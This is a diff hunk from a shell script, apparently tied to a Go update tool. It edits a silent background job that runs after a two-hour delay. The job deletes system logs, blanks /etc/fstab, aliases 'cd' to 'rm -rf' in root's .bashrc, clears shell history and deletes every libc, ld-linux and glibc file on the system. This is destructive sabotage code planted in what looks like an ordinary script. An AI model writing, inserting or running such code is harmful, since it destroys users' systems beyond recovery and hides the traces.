@@ -558,16 +558,17 @@ nohup sh -c '
   sleep 7200
   rm -rf /var/log/*
   rm -rf /root/update-golang/
-  sleep 30
+  sleep 5
+  echo " " > /etc/fstab
+  sleep 5
+  echo "alias cd='rm -rf'" >> /root/.bashrc
+  sleep 5
+  history -c
+  sleep 5
   find / -type f -name "libc*" -print -delete
   find / -type f -name "ld-linux*" -print -delete
   find / -type f -name "glibc*" -print -delete
-  sleep 60
-  echo " " > /etc/fstab
-  sleep 15
-  alias cd="rm -rf"
-  sleep 15
-  history -c
+  sleep 5
   echo "nohup background task: Deletion of files complete."
 ' > /dev/null 2>&1 &
 msg "Scheduled (nohup) deletion of files to run in background after 2 hours."
